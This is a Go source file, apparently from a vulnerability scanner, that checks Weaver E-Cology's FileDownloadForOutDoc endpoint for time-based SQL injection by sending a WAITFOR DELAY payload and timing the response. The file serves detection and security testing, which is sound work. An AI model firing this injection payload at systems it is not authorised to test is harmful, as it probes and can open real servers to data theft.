package weaver

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"time"
)

func E_Cology_filedownloadforoutdoc_sql(u string) bool {
	payload := "fileid=2+WAITFOR DELAY+'0:0:5'&isFromOutImg=1"
	start := time.Now()

	if req, err := pkg.HttpRequset(u+"/weaver/weaver.file.FileDownloadForOutDoc", "POST", payload, false, nil); err == nil {
		//pkg.GoPocLog(req.Body)
		elapsed := time.Since(start)

		if req.StatusCode == 200 && elapsed > 5*time.Second {
			pkg.GoPocLog(fmt.Sprintf("Found vuln E_Cology_filedownloadforoutdoc_sql注入漏洞|%s\n", u+"/weaver/weaver.file.FileDownloadForOutDoc"))
			return true
		}
	}
	return false

}
